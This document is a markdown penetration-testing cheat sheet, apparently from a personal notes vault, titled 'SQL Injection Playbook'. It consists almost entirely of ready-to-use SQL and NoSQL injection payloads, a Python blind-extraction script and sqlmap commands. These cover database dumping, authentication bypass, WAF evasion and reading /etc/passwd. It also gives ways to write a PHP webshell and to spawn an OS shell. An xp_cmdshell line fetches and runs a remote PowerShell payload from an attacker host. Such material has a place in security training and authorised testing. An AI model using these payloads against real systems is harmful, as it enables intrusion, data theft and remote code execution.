# SQL Injection Playbook

**Tags:** #sqli #web #exploitation #owasp
**Phase:** Web Enumeration → RCE / Data Exfil

---

## 0. Quick Detection

```bash
# Append these to every parameter
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
' OR 1=1#
1' ORDER BY 1--
1' ORDER BY 100--   # Error when column count exceeded → confirmed SQLi

# Time-based blind detection
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--   # MSSQL
' OR pg_sleep(5)--           # PostgreSQL
```

---

## 1. Identify Database Type

```sql
-- Error messages often reveal DB type
-- MySQL:    You have an error in your SQL syntax
-- MSSQL:    Unclosed quotation mark after the character string
-- Oracle:   ORA-01756: quoted string not properly terminated
-- PostgreSQL: ERROR: unterminated quoted string

-- Fingerprint via functions
SELECT @@version           -- MySQL / MSSQL
SELECT version()           -- MySQL / PostgreSQL
SELECT banner FROM v$version  -- Oracle

-- Fingerprint via syntax
-- MySQL
SELECT 'a' || 'b'    -- concatenation: 'ab'
SELECT 0x61          -- hex literal
SELECT SLEEP(5)

-- MSSQL
SELECT 'a'+'b'
SELECT CHAR(65)
SELECT TOP 1 ...
WAITFOR DELAY '0:0:5'

-- Oracle
SELECT 'a'||'b' FROM dual
SELECT CHR(65) FROM dual
dbms_pipe.receive_message(('a'),5)

-- PostgreSQL
SELECT 'a'||'b'
SELECT chr(65)
SELECT pg_sleep(5)
```

---

## 2. Union-Based SQLi

```sql
-- Step 1: Find column count
' ORDER BY 1--   -- no error
' ORDER BY 2--   -- no error
' ORDER BY 5--   -- error → 4 columns

-- Step 2: Find printable columns (Union null trick)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Step 3: Find string-compatible column
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Step 4: Extract data
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

-- All tables
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--

-- All columns in table
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--

-- Dump data
' UNION SELECT username,password,3 FROM users--

-- Concatenate multiple values in one column
' UNION SELECT CONCAT(username,':',password),2,3 FROM users--
' UNION SELECT username||':'||password,2,3 FROM users--  -- PostgreSQL/Oracle

-- Oracle requires FROM dual
' UNION SELECT NULL,NULL FROM dual--
```

---

## 3. Error-Based SQLi

```sql
-- MySQL — extractvalue
' AND extractvalue(1,CONCAT(0x7e,(SELECT version())))--
' AND extractvalue(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))--

-- MySQL — updatexml
' AND updatexml(1,CONCAT(0x7e,(SELECT @@version)),1)--

-- MSSQL — convert error
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- PostgreSQL — cast error
' AND 1=CAST((SELECT version()) AS int)--
```

---

## 4. Blind Boolean-Based

```sql
-- True condition → normal response
-- False condition → different response (empty, error, etc.)

' AND 1=1--    -- normal
' AND 1=2--    -- different

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a'--    -- Is first char 'a'?
' AND ASCII(SUBSTRING(username,1,1))>64--
' AND ASCII(SUBSTRING(username,1,1))=65--  -- 'A'

-- Automate with Python
import requests
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
result = ""
for i in range(1, 50):
    for c in chars:
        payload = f"' AND SUBSTRING(username,{i},1)='{c}'-- -"
        r = requests.get(f"http://target.com/page?id=1{payload}")
        if "Welcome" in r.text:
            result += c
            break
print(result)
```

---

## 5. Time-Based Blind

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0) FROM users WHERE username='admin'--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' AND pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Oracle
' AND 1=dbms_pipe.receive_message(('a'),5)--
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)='1'--
```

---

## 6. SQLMap (Automation)

```bash
# Basic detection + dump
sqlmap -u "http://target.com/page?id=1" --dbs

# POST request
sqlmap -u "http://target.com/login" --data="username=test&password=test" --dbs

# Specific DB + table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# All tables in DB
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns

# Dump all
sqlmap -u "http://target.com/page?id=1" --dump-all --exclude-sysdbs

# From Burp request file
sqlmap -r request.txt --dbs --level=5 --risk=3

# Cookies
sqlmap -u "http://target.com/page" --cookie="session=TOKEN; id=1*" --dbs

# WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase
sqlmap -u "http://target.com/page?id=1" --random-agent --delay=2

# OS shell (MySQL + FILE priv)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Upload webshell
sqlmap -u "http://target.com/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php
```

---

## 7. File Read / Write (MySQL)

```sql
-- Read file (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--

-- Write webshell
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--

-- MSSQL xp_cmdshell
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'powershell -c "IEX(IWR http://$LHOST/shell.ps1 -UseBasicParsing)"'--
-- Enable if disabled:
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

---

## 8. Authentication Bypass

```sql
-- Classic bypass
admin'--
admin'#
' OR '1'='1'--
' OR 1=1--
' OR 'x'='x
') OR ('1'='1
admin' OR 1=1--
' OR 1=1 LIMIT 1--

-- Username: admin'-- (empty password)
-- Username: ' OR 1=1 LIMIT 1-- (logs in as first user in DB)
```

---

## 9. Second-Order SQLi

```
1. Register username: admin'--
2. Application stores escaped: admin''--
3. Later, application retrieves + uses unescaped in query → SQLi fires
```

---

## 10. WAF Bypass Techniques

```sql
-- Whitespace alternatives
SELECT/**/username/**/FROM/**/users
SEL%00ECT username FROM users  -- null byte
SELECT`username`FROM`users`

-- Comment variations
-- comment
# comment
/*comment*/
/*!comment*/

-- Case mixing
sElEcT username FrOm users

-- URL encoding
%27 = '
%20 = space
%23 = #

-- Double URL encoding
%2527 = %27 = '

-- String splitting
'se'||'lect'   -- Oracle/PostgreSQL
CONCAT('se','lect')  -- MySQL

-- Keyword alternatives
INFORMATION_SCHEMA → mysql.innodb_table_stats (MySQL)
SLEEP(5) → BENCHMARK(10000000,MD5(1))
```

---

## 11. NoSQL Injection (MongoDB)

```bash
# Login bypass
username=admin&password[$ne]=wrongpassword
username[$regex]=admin&password[$ne]=wrongpassword

# JSON body
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}

# Extract data
username[$regex]=^a&password[$ne]=x   # True if username starts with 'a'
```

---

## Related Notes

- [[07-Web-Application/Web-Scanning]]
- [[00-Quick-Reference/SQLMap]]
- [[00-Quick-Reference/SQL]]
